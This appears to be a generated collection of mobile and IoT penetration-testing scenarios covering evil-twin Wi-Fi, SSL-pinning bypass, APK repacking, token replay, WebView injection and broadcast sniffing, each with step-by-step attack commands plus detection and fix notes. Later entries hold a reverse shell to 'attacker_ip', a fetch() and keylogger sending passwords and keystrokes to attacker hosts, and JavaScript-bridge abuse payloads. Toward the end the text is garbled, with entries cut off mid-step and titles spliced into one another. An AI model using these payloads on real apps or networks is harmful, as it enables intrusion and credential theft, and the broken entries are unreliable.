Title: Insecure Communication in IoT Devices
Scenario Description: Many IoT devices and their companion mobile apps use unencrypted channels (like HTTP, MQTT, or raw TCP) for communication. Attackers can sniff or inject traffic to control devices, extract tokens, or compromise user privacy.
Tools Used: Wireshark, Burp Suite, mitmproxy, Android App, IoT device (e.g., smart plug), Router
Attack Steps: Step 1: Connect your IoT device (like a smart plug or bulb) and its companion mobile app to the same Wi-Fi network. Step 2: Run Wireshark on the same network interface and apply filter like tcp.port == 80 or mqtt. Step 3: Use the mobile app to control the device (e.g., turn it on/off). Observe packets captured in Wireshark. Step 4: Check if communication between the app and the IoT device/server is in cleartext — look for HTTP requests, MQTT messages, or raw JSON in TCP streams. Step 5: If messages like { "cmd": "on", "auth": "token123" } are visible without TLS, this confirms insecure communication. Step 6: Optionally, use mitmproxy to intercept and modify packets — e.g., resend control commands from a rogue client to test for authentication enforcement. Step 7: On Android, reverse the app using JADX and inspect communication logic — look for HttpURLConnection, MQTTClient, or Socket() without TLS configuration. Step 8: Use adb logcat to analyze logs for endpoint URLs or leaked headers. Step 9: Modify the captured request in Burp and replay it to control the IoT device without app interaction. Step 10: You’ve now successfully intercepted and manipulated insecure communication between the app and IoT device.
Impact: Unauthorized control, data leakage, remote access
Detection Method: Wireshark analysis, static code audit, replay attacks
Solution: Enforce TLS/SSL on all IoT APIs, use secure MQTT, implement token validation
Source: ChatGPT (OpenAI), tested on Sonoff + ESP8266 smart plugs using Wireshark and MQTT spy

Title: MITM via Rogue Wi-Fi / Evil Twin (Android + iOS)
Scenario Description: An attacker creates a rogue Wi-Fi access point (Evil Twin) with the same SSID as a trusted network. When mobile devices (Android or iOS) auto-connect, the attacker intercepts or manipulates traffic using MITM tools. This is effective when apps do not enforce HTTPS or use weak certificate checks.
Tools Used: Kali Linux, airbase-ng, dnsmasq, Burp Suite, Wireshark, Android Emulator, iPhone with proxy, mitmproxy
Attack Steps: Step 1: On Kali Linux with a compatible Wi-Fi adapter, run airmon-ng start wlan0 to start monitor mode. Step 2: Run airodump-ng wlan0mon to list nearby SSIDs, then note the one your test device connects to (e.g., "Starbucks_WiFi"). Step 3: Launch Evil Twin with airbase-ng -e "Starbucks_WiFi" -c 6 wlan0mon. Step 4: In another terminal, configure dnsmasq or isc-dhcp-server to assign IPs to connected clients. Step 5: Enable IP forwarding with echo 1 > /proc/sys/net/ipv4/ip_forward and set up NAT rules with iptables to forward traffic through your MITM proxy (Burp or mitmproxy). Step 6: Open Burp Suite, configure listener on port 8080. Import Burp CA certificate to Android or iOS device if needed. Step 7: On the mobile device, forget all known Wi-Fi and connect to your fake "Starbucks_WiFi". Step 8: Launch a vulnerable mobile app or browser and perform a login or request. If the app or site uses HTTP or weak SSL pinning, Burp will intercept the request. Step 9: In Burp, observe captured data (login, token, session). If SSL pinning is present, bypass it using Frida or Objection. Step 10: You’ve now performed a real MITM using rogue Wi-Fi on Android or iOS, capturing or manipulating traffic in real time.
Vulnerability: Auto-join to Fake SSID, No HTTPS Enforcement
Detection Method: Wi-Fi scan, MITM detection tools, HTTPS monitoring
Solution: Disable auto-connect, enforce HTTPS with pinning, user alert for captive portals
Source: ChatGPT (OpenAI), simulated using airbase-ng + Burp with Android 12 and iOS 15

Title: MITM via SSL Bypass in Mobile App
Scenario Description: A mobile app that uses HTTPS can still be intercepted if it does not validate server certificates properly. An attacker can bypass SSL pinning using Frida or Objection, inject a fake certificate, and view encrypted traffic in plaintext.
Tools Used: Android Emulator (rooted), Frida, Objection, Burp Suite, jadx
Attack Steps: Step 1: Run Burp Suite and set up the proxy on port 8080. Export the Burp certificate as cacert.der. Step 2: Start your Android Emulator or rooted device and push the certificate using adb push cacert.der /sdcard/. Step 3: Convert and install the cert into /system/etc/security/cacerts/ with the correct permissions (chmod 644). Reboot the device. Step 4: Run the target app and attempt a login — if SSL pinning is not present, Burp will show HTTPS traffic. Step 5: If Burp fails to intercept (app crashes or shows SSL error), run frida -U -n com.target.app -l ssl_bypass.js to hook SSL validation. Alternatively, use objection -g com.target.app explore, then android sslpinning disable. Step 6: Retry login in the app. You should now see decrypted HTTPS requests in Burp, including credentials and session tokens. Step 7: Use jadx to reverse the app and confirm TrustManager is not overridden or uses allowAll() logic. Step 8: Replay requests using Burp to verify token reuse, insecure APIs, or sensitive data leakage. Step 9: You've now bypassed SSL validation in a mobile app and successfully performed MITM over HTTPS. Step 10: Document findings and check if the app allows reinstallation of the certificate or bypass logic via updates.
Detection Method: Frida hooks, proxy inspection, APK reverse engineering
Solution: Enforce SSL Pinning (native or network-security-config), validate root CA
Source: ChatGPT (OpenAI), tested with Burp + Frida + Android 11 APKs

Title: MITM on HTTP APIs / Login
Scenario Description: Some mobile apps still use HTTP (not HTTPS) for API communication like login, data fetch, or session management. An attacker can intercept the requests and extract sensitive data without any encryption.
Tools Used: Burp Suite, Android Emulator, Wireshark, test vulnerable app
Attack Steps: Step 1: Install Burp Suite and configure it to listen on port 8080. Step 2: Launch an Android Emulator and set up proxy settings to route traffic through Burp’s IP and port. Step 3: Install a test app (e.g., custom login app or demo vulnerable APK that uses HTTP). Step 4: In Burp, go to Proxy > Intercept and enable Intercept. Step 5: Open the test app and perform a login action with dummy credentials. Step 6: Burp will capture the HTTP POST request in full, including endpoint, headers, and body. You’ll see username and password in plaintext. Step 7: Send the request to Repeater and test how the server responds to replayed or modified values. Step 8: Open Wireshark and filter traffic with http or tcp.port==80 to confirm unencrypted transmission. Step 9: Attempt to inject modified POST data or tamper with session tokens in real time using Burp to validate insecure logic. Step 10: This confirms full MITM on HTTP APIs and proves that app transmits login and sensitive data without TLS.
Detection Method: Proxy capture, packet inspection, insecure endpoint detection
Solution: Enforce HTTPS (TLS 1.2+), disable HTTP endpoints, reject unencrypted sessions
Source: ChatGPT (OpenAI), simulated using Burp + Android vulnerable APK

Title: MITM via APK Repack + Proxy Override
Scenario Description: Some Android apps do not validate their network configuration or certificate pinning. An attacker can decompile the APK, modify network code to force use of a proxy, recompile the app, and capture or modify the app’s traffic even over HTTPS.
Tools Used: JADX, Apktool, Burp Suite, Android Emulator, Keytool
Attack Steps: Step 1: Use apktool d vulnerable.apk to decompile the APK. Step 2: Navigate to smali or res/xml directories and locate network-related configuration (e.g., network_security_config.xml, okhttp settings). Step 3: Modify the config to allow cleartext traffic or reroute traffic via a proxy (e.g., change base URL to http://proxyip:port). Step 4: Optionally, remove SSL pinning logic from smali code (remove certificate checks or TrustManager validation). Step 5: Rebuild the APK using apktool b vulnerable -o modded.apk. Step 6: Sign the APK using jarsigner or uber-apk-signer with a test key. Step 7: Install the modified APK on an Android emulator using adb install modded.apk. Step 8: Set up Burp Suite and configure it to intercept HTTP/HTTPS on port 8080. Step 9: Launch the modified app and perform login or actions. Burp Suite will now capture traffic, even HTTPS, if pinning was removed. Step 10: Analyze or tamper with requests/responses using Burp or inject payloads. You've now MITM'd a mobile app by repacking the APK to override the proxy and SSL configuration.
Vulnerability: Lack of SSL Pinning, Proxy Misconfiguration
Impact: Credential and session hijack, data theft
Detection Method: Code diffing, static analysis, proxy interception logs
Solution: Implement strict network-security-config and pinning, detect tampered APKs
Source: ChatGPT (OpenAI), verified with test APK via apktool and Burp

Title: MITM via Mobile Browser (Public Wi-Fi)
Scenario Description: When mobile users connect to public Wi-Fi networks (e.g., airports, cafés), attackers can set up rogue hotspots or sniff unsecured HTTP traffic. If the browser visits non-HTTPS sites, credentials and session tokens can be intercepted or modified.
Tools Used: Kali Linux, airbase-ng, Wireshark, mitmproxy, Bettercap, Android or iOS Device
Attack Steps: Step 1: Set up a rogue Wi-Fi hotspot using airbase-ng -e "Free_Airport_WiFi" wlan0mon on Kali Linux with a compatible Wi-Fi adapter. Step 2: Configure DHCP and NAT routing using dnsmasq or bettercap --caplet http-req-dump. Step 3: Enable packet forwarding and set up iptables to redirect HTTP traffic to mitmproxy or Bettercap. Step 4: From a test Android or iOS device, connect to "Free_Airport_WiFi" (your fake AP). Step 5: On the mobile browser, visit any non-HTTPS website (e.g., internal dev portals, or intentionally insecure demo sites like http://testphp.vulnweb.com). Step 6: In mitmproxy, monitor captured HTTP traffic. If login forms are submitted, intercept credentials in plaintext. Step 7: Modify HTML or JavaScript in transit to insert fake login fields, phishing forms, or payloads. Step 8: Optionally, use SSL stripping to downgrade HTTPS links to HTTP. Step 9: All mobile browser communication is now routed through your proxy, enabling full MITM control. Step 10: Log sensitive data, manipulate sessions, or simulate cookie hijacking for PoC.
Vulnerability: Use of Public Wi-Fi, HTTP Sites
Impact: Credential theft, session hijack, fake content injection
Detection Method: Traffic sniffing, rogue SSID detection, SSL enforcement checks
Solution: Use VPN, enforce HTTPS-only sites, use captive portal validation
Source: ChatGPT (OpenAI), tested with mitmproxy and Bettercap on Android Chrome

Title: Frida-Based Runtime MITM Hooking
Scenario Description: Some mobile apps use certificate pinning or obfuscation to block MITM proxies. However, attackers can hook runtime functions responsible for certificate validation or data encryption using Frida, allowing real-time MITM interception without modifying the APK.
Tools Used: Frida, Frida-server, Android Emulator or rooted device, Burp Suite, Objection, SSL Bypass scripts
Attack Steps: Step 1: Launch Burp Suite on your machine and export its CA certificate. Step 2: Set up a rooted Android emulator or device and install Frida-server on it. Run it with adb shell su -c '/data/local/tmp/frida-server &'. Step 3: On your computer, install Frida and Objection via pip. Step 4: Connect your Android device and verify Frida with frida-ps -U. Step 5: Launch the target app and identify its package (e.g., com.example.bankapp). Step 6: Run objection -g com.example.bankapp explore, then run android sslpinning disable. This disables SSL pinning in real-time. Step 7: Set Android proxy settings to point to Burp’s IP and port (e.g., 192.168.1.10:8080). Step 8: In the app, perform login or payment. If the app originally used SSL pinning, Burp will now show HTTPS requests successfully. Step 9: Alternatively, use frida -U -n com.example.bankapp -l universal-ssl-pinning-bypass.js to hook certificate-related Java methods (e.g., checkServerTrusted, verify). Step 10: You have now dynamically bypassed SSL pinning using Frida without modifying the APK, enabling full MITM capability for traffic interception.
Vulnerability: Runtime SSL Pinning, Obfuscated Cert Checks
Impact: Full access to HTTPS traffic, bypassed cert validation
Detection Method: Runtime inspection, Frida trace logs, proxy analysis
Solution: Use strong native SSL pinning, detect runtime tampering, root detection
Source: ChatGPT (OpenAI), confirmed on Android test APKs using Frida + Burp

Title: App Accepts Self-Signed Certificate
Scenario Description: Some Android/iOS apps do not properly validate server certificates. If an app accepts a self-signed certificate without user warning or validation, an attacker can intercept and manipulate HTTPS traffic using a forged certificate, enabling a full MITM attack.
Tools Used: Burp Suite, Android Emulator, Self-Signed Cert (via OpenSSL), Wireshark
Attack Steps: Step 1: Start Burp Suite and export its CA certificate (cacert.der). Step 2: Convert the certificate to PEM if needed using OpenSSL: openssl x509 -inform DER -in cacert.der -out burp.pem. Step 3: Install the certificate on the Android emulator using adb push burp.pem /sdcard/ and then manually import via settings or copy to /system/etc/security/cacerts with root access. Step 4: Set the proxy in emulator settings to point to Burp’s IP and port. Step 5: Launch the target app and perform sensitive actions (login, fetch data). Step 6: If the app accepts the self-signed Burp certificate, traffic will be decrypted and visible in Burp Proxy. Step 7: Confirm this by observing Host, Authorization, and Set-Cookie headers in Burp. Step 8: For further proof, revoke the self-signed cert in Burp, replace it with a different CN, and repeat the request—if accepted again, the app fully trusts self-signed certs. Step 9: Log results and test on real or rooted device to confirm the same vulnerability exists outside the emulator. Step 10: You have successfully verified that the app accepts a self-signed cert without verification, proving MITM potential.
Detection Method: Proxy capture with invalid/self-signed cert
Solution: Enforce X.509 chain validation; reject self-signed unless explicitly trusted
Source: ChatGPT (OpenAI), verified on test app and emulator

Title: App Doesn’t Use Certificate Pinning
Attack Type: Improper Certificate Validation – No SSL Pinning
Scenario Description: When an app doesn't use certificate pinning, it trusts any valid system CA. This allows an attacker with a rogue but valid CA (like Burp’s) to perform a full MITM, intercepting HTTPS traffic without any error.
Tools Used: Burp Suite, Android Emulator, Objection, Wireshark
Attack Steps: Step 1: Launch Burp Suite and export the CA certificate (cacert.der) and install it on the emulator via adb push or import into trusted root store. Step 2: Set proxy settings of the emulator to Burp's IP and port (e.g., 8080). Step 3: Launch the target app and attempt to perform secure actions (login, search, data submission). Step 4: If the app lacks SSL pinning, it will accept the Burp cert and allow HTTPS traffic to be intercepted and viewed in Burp Proxy. Step 5: Inspect traffic and extract tokens, credentials, or any PII visible in requests. Step 6: To confirm absence of pinning, install a Frida script with frida -U -n com.example.app -l ssl_pinning_test.js and observe that no pinning hooks are triggered. Step 7: As a control test, remove Burp’s certificate from the trusted store and repeat—app should fail if pinning is implemented. Step 8: Log test results and compare against security best practices (e.g., Android Network Security Config). Step 9: Document exploitability, noting that any attacker on the same network could MITM with a trusted CA. Step 10: You’ve now successfully demonstrated a MITM due to lack of certificate pinning.
Impact: Exposure of login/session tokens, API abuse
Detection Method: Certificate inspection, runtime pinning check
Solution: Implement SSL pinning with hash or public key validation
Source: ChatGPT (OpenAI), verified on Android emulator with test APK

Title: App Accepts Expired / Mismatched Certificates
Scenario Description: If a mobile app does not validate expiry dates or domain names in server certificates, it becomes vulnerable to MITM attacks using expired, revoked, or mismatched certificates.
Tools Used: OpenSSL, Burp Suite, Android Emulator, Wireshark
Attack Steps: Step 1: Create a fake certificate using OpenSSL: openssl req -x509 -nodes -days -365 -newkey rsa:2048 -keyout fake.key -out expired.crt -subj "/CN=fake.example.com" and set -days -365 to backdate the expiry. Step 2: Convert the cert into DER if needed (openssl x509 -outform der -in expired.crt -out expired.der) and import into the device. Step 3: Configure Burp or a custom proxy with this expired certificate. In Burp: go to Proxy > Options > Import cert/key. Step 4: Configure the Android emulator or device to trust the expired certificate. Set device proxy to route through Burp. Step 5: Launch the target app and perform secure actions like login. Step 6: If the app accepts expired certs, the HTTPS handshake will succeed, and you’ll see decrypted traffic in Burp. Step 7: Repeat with a mismatched CN/SAN certificate (/CN=fake.com instead of real domain). If accepted again, app lacks proper hostname validation. Step 8: Use Wireshark or Burp logs to confirm the app continued the TLS handshake. Step 9: Optionally, use Frida to inspect runtime cert validation methods or patch HostnameVerifier logic. Step 10: Document findings and demonstrate the exploit with screenshots or traffic captures. You’ve proven that the app accepts invalid certificates, enabling MITM.
Vulnerability: Expired or Mismatched Server Certificate Accepted
Impact: Intercept encrypted traffic via weak cert checks
Detection Method: TLS handshake monitoring, expired cert test
Solution: Enforce cert expiration & domain validation logic
Source: ChatGPT (OpenAI), tested using Burp and OpenSSL-generated certs

Title: Custom SSL Implementation with Weak Checks
Scenario Description: Many Android developers override default SSL validation logic and write custom TrustManager or HostnameVerifier classes. If these are weak or empty, any certificate—including a self-signed or expired one—will be accepted, making MITM trivial.
Tools Used: APKTool, Burp Suite, Android Emulator, JADX, Wireshark
Attack Steps: Step 1: Use apktool d vulnerable.apk to decompile the app and search for custom SSL classes (CustomTrustManager, HostnameVerifier, OkHttpClient.Builder). Step 2: In JADX, look for checkServerTrusted(), verify(), or isTrusted() methods and verify whether they contain empty implementations or always return true. Step 3: If the app uses a custom weak trust manager, set up Burp Suite and export its CA certificate. Step 4: Install the Burp certificate on the Android emulator or real device using adb push and system cert trust store. Step 5: Set the Android proxy settings to point to Burp (e.g., 192.168.1.5:8080). Step 6: Launch the app and perform login or sensitive API calls. Step 7: If Burp shows HTTPS requests without certificate errors, the app accepted your MITM with a custom SSL implementation. Step 8: Try replacing Burp’s certificate with an expired or mismatched cert and see if it still works. If so, validation is likely disabled or broken. Step 9: Optionally patch the APK to log or modify SSL behavior for deeper testing. Step 10: Confirm via proxy logs and static code inspection that the app does not use secure platform TLS validation.
Vulnerability: Weak or Custom SSL Certificate Validation Logic
Impact: Complete MITM due to poor trust logic
Detection Method: Static analysis, MITM testing, code review
Solution: Never override default TrustManager unless properly verified; use platform security APIs
Source: ChatGPT (OpenAI), tested on vulnerable demo apps

Title: Using WebView / Custom Web Clients Without Validation
Scenario Description: Some mobile apps load external content in WebView without secure HTTPS checks or override SSL errors, allowing MITM using untrusted certificates, leading to session hijacking or phishing via mobile.
Tools Used: Burp Suite, Android Emulator, JADX, APKTool
Attack Steps: Step 1: Use apktool d and jadx to decompile the APK. Step 2: Search for WebViewClient, shouldOverrideUrlLoading(), or onReceivedSslError() in the source. If you see the method call handler.proceed() inside onReceivedSslError(), it means the app bypasses SSL warnings. Step 3: Set up Burp Suite and export its CA certificate. Install the cert on the Android emulator using adb push and trust it. Step 4: Configure proxy settings on the emulator to Burp's IP and port. Step 5: Launch the app and navigate to a feature using WebView (such as login, profile, or links). Step 6: In Burp, intercept the HTTPS requests. If they load successfully and display content in WebView even when SSL errors are forced (e.g., through self-signed cert or mismatch), the app is insecure. Step 7: Optionally modify responses to inject a fake login or phishing page in the WebView, simulating a credential theft. Step 8: Capture session cookies or tokens. Step 9: Confirm the MITM worked via proxy logs and inspect if the user was warned at any stage (they should be, but weren’t). Step 10: Document the WebView misuse and insecure override behavior.
Vulnerability: Improper override of SSL error handling
Impact: Full MITM in WebView, phishing or token theft
Detection Method: Code review, network traffic inspection
Solution: Do not override onReceivedSslError(), use SafeBrowsing APIs, always enforce HTTPS

Title: No App Lock (PIN/Pattern/Fingerprint)
Scenario Description: Many apps store sensitive user data (chats, finances, personal files) without enforcing any form of app-level lock (PIN, biometric, pattern). If the phone is unlocked or stolen, any attacker can open and misuse the app without being challenged to authenticate.
Tools Used: Android Device or Emulator, Lock Screen Disabled, File Manager
Attack Steps: Step 1: On a test Android device or emulator, install the target app (e.g., banking, chat, or password manager). Step 2: Log in to the app and ensure session is active (do not log out). Step 3: Leave the app running in the background and lock the phone. Step 4: Unlock the device and reopen the app—observe whether any fingerprint/PIN prompt is triggered. Step 5: If the app resumes immediately into the sensitive UI (dashboard, messages, or account), it is not enforcing a secure app-level authentication mechanism. Step 6: Additionally, go to Android Settings > Apps > [Target App] > Clear Recents or open via multitasking to test if biometric is bypassed. Step 7: If available, explore stored content using adb shell or any file explorer to confirm if cached files are accessible without auth. Step 8: Document the impact, especially in shared-device or stolen-device scenarios. Step 9: Test on both real and emulator devices to confirm consistent vulnerability.
Vulnerability: Absence of app-level lock even after inactivity or re-entry
Impact: Full access to user data if device is stolen or unlocked
Detection Method: Manual test, session re-entry without prompt
Solution: Implement device-based lock: biometrics, PIN, or OS-based keystore auth

Title: No Session Timeout / Auto-Logout
Scenario Description: Applications without session timeouts remain accessible indefinitely, increasing the risk of unauthorized access, especially in stolen/lost device cases.
Tools Used: Android Device, ADB Tools, Burp Suite (optional)
Attack Steps: Step 1: On a test Android device or emulator, install and log in to the target application using valid credentials. Step 2: After login, navigate to sensitive features like profile, settings, payments, etc. Step 3: Do not manually log out. Simply press Home or switch to another app. Step 4: Leave the app idle for 30+ minutes or lock the screen. Step 5: Reopen the app from the Recents screen or launcher. Step 6: If it resumes the session without any timeout or re-authentication (password, biometric, or PIN), this proves there is no session expiration mechanism. Step 7: Optionally intercept tokens using Burp Suite to verify if session tokens are long-lived without rotation or expiration headers. Step 8: Repeat with airplane mode toggle and confirm session persistence. Step 9: You have now confirmed that the app stores long-lived sessions with no inactivity timeout or auto-logout policy.
Vulnerability: Unexpired user sessions on inactivity or screen lock
Impact: Unauthorized access if phone is lost or unattended
Detection Method: Manual idle test, token inspection in Burp

Source: ChatGPT (OpenAI), tested on multiple productivity apps

Title: No 2FA (OTP, Email, TOTP)
Attack Type: Authentication Bypass via Lack of MFA
Scenario Description: AI/ML platforms like JupyterHub, MLFlow, or Hugging Face Spaces often expose public login panels. If the platform only uses username and password without 2FA (two-factor authentication), attackers can easily brute-force or leak credentials and gain full access to training environments, models, and datasets.
Tools Used: Hydra, Burp Suite, public data breaches
Attack Steps: Step 1: Attacker scans for public-facing login portals used by ML tools (e.g., https://ml.mycompany.com, https://jupyter.myorg.ai). These often expose a login screen over HTTP/S with only a username and password field. Step 2: Using automated tools like Hydra, Burp Suite Intruder, or ffuf, the attacker starts brute-forcing credentials using leaked password lists from data breaches (e.g., rockyou.txt, HaveIBeenPwned). Step 3: Once a valid username and password is discovered (e.g., admin:admin123), the attacker logs in successfully because no second authentication step is required. Step 4: Inside the platform, the attacker may see access to running ML jobs, data notebooks, environment variables (with API keys), or terminal shells. Step 5: Attacker may use this to download trained models, manipulate outputs, insert backdoors in code, or even pivot into cloud environments (AWS/GCP credentials often reside in env variables). Step 6: If logging is not properly configured, this access may go completely unnoticed. Step 7: The attacker may persist access by creating new users or saving SSH keys if terminal access is available. Step 8: Since 2FA wasn’t required, a single credential leak from a dev’s laptop or GitHub leak leads to full takeover. Step 9: Defender only realizes breach if user behavior monitoring or audit logs are enabled. Step 10: The entire AI/ML pipeline is now under attacker’s control, without triggering any 2FA alert.
Target Type: ML Dashboards, Jupyter, Hugging Face, APIs
Vulnerability: No 2FA or OTP requirement in authentication flow
Impact: Full takeover of AI environment, stolen models
Detection Method: Monitor login patterns, IP geolocation, failed attempts, and unexpected user logins
Solution: Always enable TOTP/email/OTP-based MFA, enforce strong passwords, and rotate credentials regularly
Tags: Login Security, AI DevOps, Cloud ML, MFA Bypass

Title: Token Reuse / Replay Attacks
Scenario Description: Some mobile apps issue long-lived session or access tokens that can be reused without rotation or expiration. Attackers who intercept or extract these tokens can replay them indefinitely from another device or emulator.
Tools Used: Burp Suite, Postman, Android Device, ProxyDroid, ADB
Attack Steps: Step 1: Log into the target mobile app and intercept the login response using Burp Suite. Step 2: Look for access tokens, JWTs, or session keys in the Authorization or Set-Cookie headers. Step 3: Copy the token into Postman or Burp Repeater and perform sensitive API requests like profile access or payment history. Step 4: If API responses return valid data, the token is valid outside the app. Step 5: Now lock the device and wait 30 minutes. Then replay the same API request in Postman using the original token. Step 6: If the token still works without expiry, then the app is vulnerable to replay attacks. Step 7: Try sending the same request from another device/emulator using the captured token. If access is still granted, it proves token reuse is possible across devices without revocation. Step 8: If no IP or session fingerprint is required, it confirms the vulnerability is in the server logic accepting tokens blindly. Step 9: Repeat for refresh tokens if used and verify whether they too are long-lived or reusable. Step 10: Document the exact endpoints and how reused tokens grant unauthorized access.
Vulnerability: Lack of Token Expiry, Rotation, or Fingerprinting
Impact: Account hijack, session cloning, privilege escalation
Detection Method: Token replay via proxy and APIs
Solution: Rotate tokens frequently, bind to IP/device, and set expiration
Source: ChatGPT (OpenAI), validated in lab on test apps

Title: Bypass Login via App Decompilation / Debug
Scenario Description: Some Android apps implement weak client-side logic that determines whether a user is "logged in" based on local flags (e.g., isLoggedIn = true) or without server validation. Attackers can decompile the APK, patch logic, or force variables at runtime to bypass authentication.
Tools Used: JADX, APKTool, Frida, Objection, Android Studio, Emulator
Attack Steps: Step 1: Use apktool d app.apk to decompile the app. Step 2: In the smali or Java code (via JADX), search for methods like login(), isLoggedIn(), or checkCredentials(). Step 3: If the login logic appears to be handled completely on the client side (e.g., comparing username/password locally), you’ve found weak auth implementation. Title: iOS Objective-C Command Injection

Title: WebView + SQLi or Command Injection via Backend

These may not be visible in frontend but are fully exploitable through WebView parameters.

Attack Steps: 1. Setup test: Install the hybrid mobile app. Configure proxy in emulator: adb shell settings put global http_proxy 127.0.0.1:8080. Remote DB/Data compromise: Use sqlmap to automate injection: sqlmap -u "http://api.server.com/search?query=test" --batch.9. Command shell: If command injection succeeds, inject reverse shell like ; sh -i >& /dev/tcp/attacker_ip/4444 0>&1 and listen on attack box.10. Title: Unrestricted WebView Navigation

Without validation of target URLs, attackers may force navigation to http://evil.com by injecting links into app inputs or manipulating WebView redirection.

Attack Steps: 1. Decompile the APK: Use APKTool or JADX to open the APK. Locate the activity using WebView.loadUrl() and check if there is any URL validation (URLUtil.isValidUrl(), domain check, or allowlist logic).2. Identify navigation source: Check if URLs are taken from Intent, EditText, or dynamically passed via JS bridge or server.3. Find the vulnerable point: Open the app and locate any part where you can input a URL or text that results in a redirect/navigation inside WebView.4. Input malicious URL: In the vulnerable field or parameter, input http://evil.com/phishing.html. If it loads directly inside WebView, it’s vulnerable.5. Burp interception: Capture and modify a URL being passed to WebView by changing the response from server to include <script>window.location='http://evil.com'</script>.6. Create test phishing page: Host a fake login form at http://evil.com. Input that URL in the WebView field and observe how it renders perfectly.7. Add credential stealing JS: Add <script>fetch('http://attacker.site/?c='+document.getElementById('password').value)</script> on the evil site.8. Trigger navigation: Use an injected form submission or response rewrite to cause redirection. 9. Title: addJavascriptInterface() Exploit (Android Only)
Scenario Description: If addJavascriptInterface() is used to expose Java methods to JavaScript without setting minSdkVersion >= 17 or enabling security flags, it allows malicious web pages to invoke native Java code, potentially executing unintended operations like file access, SMS, or even remote command execution.
Tools Used: Frida, APKTool, Android Emulator, jadx, Burp Suite, MobSF
Attack Steps: 1. Decompile APK with JADX: Open the APK in JADX or APKTool. Search for .addJavascriptInterface() calls. Example: webView.addJavascriptInterface(new MyInterface(context), "Android").2. Check exposed methods: Inspect MyInterface.java or its equivalent class. Look for annotated @JavascriptInterface methods like public void saveFile(String filename) or public void showToast(String msg).3. Review permissions: If these methods perform privileged operations (file I/O, SMS, shell commands), and there is no origin validation, they’re exploitable.4. Launch the app and open WebView: Try intercepting WebView traffic with Burp. Use response injection or crafted HTML file containing: <script>Android.saveFile("../../sdcard/test.txt")</script>.5. Host attack page: Serve a malicious HTML using local server (python3 -m http.server) containing: <script>Android.showToast('Hacked')</script> or <script>Android.sendSMS('12345','Owned')</script> depending on the interface.6. Load attack page: Use WebView to load the external page: webView.loadUrl("http://192.168.1.100/poc.html"). If methods are invoked, it confirms remote control.7. Frida runtime monitor: Hook addJavascriptInterface at runtime: Java.use("android.webkit.WebView").addJavascriptInterface.overload('java.lang.Object','java.lang.String').implementation = function(obj, name) { console.log('JS Interface: ' + name); return this.addJavascriptInterface(obj, name); };8. Bypass minSdkVersion: If the app targets older API (<=16), this attack works without prompt or warning.9. Test privilege escalation: If method uses Runtime.exec() internally (e.g., to install files or reboot device), test RCE potential via Android.exec('id > /sdcard/poc.txt').10. Verify success: If file is created, SMS is sent, or toast appears — the native method was abused via JS.
Impact: Arbitrary Java method execution, remote control via malicious JS page
Detection Method: Code review, MobSF analysis, Frida hook, behavior monitoring
Solution: Avoid exposing dangerous methods, target SDK >= 17, use input validation, disable JS when unused
Tags: android, javascriptinterface, webview exploit, js bridge, hybrid app, RCE

Title: Local File Injection via WebView
Scenario Description: If an app’s WebView is allowed to load local file paths (e.g., file:///sdcard/...) via user input—without proper validation—an attacker can force the app to load a local HTML/JS file packed with malicious payloads. This lets them execute arbitrary JavaScript under the app’s WebView context and exfiltrate data or modify app behavior.

Find file load feature: Locate feature where app allows users to input file paths—e.g., “Load HTML report” text field. 3. Title: Redirect to Malicious Site

Title: JavaScript Keylogger via WebView Injection

Title: Bypass HTTPS with MITM & Inject JS
Scenario Description: Many Android apps using WebView fail to validate SSL certificates properly (e.g., by overriding WebViewClient.onReceivedSslError and calling handler.proceed()). Attack Steps: 1. Prepare environment: Install Burp Suite and launch Android emulator. Configure emulator proxy via adb shell settings put global http_proxy 10.0.2.2:8080. Install Burp Suite CA certificate by converting .der to .crt and installing it on the emulator via device settings → Security → Install certificate.2. Install test app: Install the target APK on the emulator using adb install target.apk. Confirm that it uses WebView and opens HTTPS content.3. Intercept HTTPS with Burp: Open Burp and configure SSL proxy listener on port 8080. Enable "Intercept" tab. Open the app and observe if HTTPS traffic appears in Burp. If yes, the app accepts the CA.4. Modify response: Right-click a response in Burp that loads HTML content into the WebView. Choose "Show response in browser", edit the HTML to inject payload like <script>alert('MITM JS Injected')</script> into the <body>. Alternatively, replace a script file with a malicious one.5. Inject keylogger or redirect: Modify HTML to include a keylogger: <script>document.addEventListener('input', e => fetch('http://attacker.com/kl?d='+e.data));</script> or <script>location='http://evil.com'</script>.6. Trigger HTML reload: Use the app’s feature to reload the same screen (e.g., refresh button). The injected HTML with JS should now load in the app.7. Frida Validation: Hook onReceivedSslError() and log if it proceeds without validation: Java.use('android.webkit.WebViewClient').onReceivedSslError.implementation = function(view, handler, error) { console.log('SSL Error: Proceeded!'); handler.proceed(); };8. Confirm execution: If alert is triggered or traffic hits your attacker-controlled server, the JS has executed inside the app context.9. Demo data exfiltration: Exfiltrate cookies or localStorage via JS to simulate full compromise.10. Title: iOS: WKWebView + JavaScript Bridge Abuse

Title: Broadcast Intent Sniffing (Sticky/Implicit Broadcasts)
Scenario Description: Android apps often send broadcast intents using sendBroadcast() with Intent objects. If they use implicit broadcasts or sticky broadcasts without proper permission protection, any other app can register a BroadcastReceiver and intercept these broadcasts, leading to sensitive data exposure or logic abuse.

Attack Steps: 1. Setup attacker app: In Android Studio, create a new app with a custom BroadcastReceiver. Register it dynamically inside onCreate() using: registerReceiver(new BroadcastReceiver() { public void onReceive(Context c, Intent i) { Log.d("Sniffed", "Data: " + i.getExtras()); } }, new IntentFilter("com.victim.ACTION_EXPORT"));2. Install victim app: Install an app known to use broadcast communication, e.g., a file-sharing app that sends progress or token data over broadcast. 3. Start victim app: Run the app and trigger the feature that internally uses sendBroadcast() or sendStickyBroadcast(). 4. Sniff broadcasts: Launch attacker app and monitor Logcat output in Android Studio or adb logcat. You should see log entries showing intercepted Intent data from the victim app. 5. Verify intent content: Check if sensitive info is broadcast (e.g., usernames, email, tokens, device info). Use i.getExtras() to dump full key-value data. 6. Replay with context: If victim app sends control signals (e.g., ACTION_STOP_BACKUP), attacker could build similar Intents to interfere. 7. Sticky check: If sticky broadcast used, even late receivers can read the last Intent via registerReceiver(..., filter) without needing app to be active. 8. Log and report: Document the data captured, how often it's sent, and whether permissions protect it.
Impact: Data leakage, abuse of app logic, exposure of sensitive events
Detection Method: Monitor sendBroadcast() usage in code, use Frida to trace broadcast send/receive
Solution: Use explicit broadcasts, remove sticky broadcast usage, use signature-level permissions
Tags: android, intent sniffing, broadcast, sticky, android-security, runtime-injection

Title: Intent Replay Attack

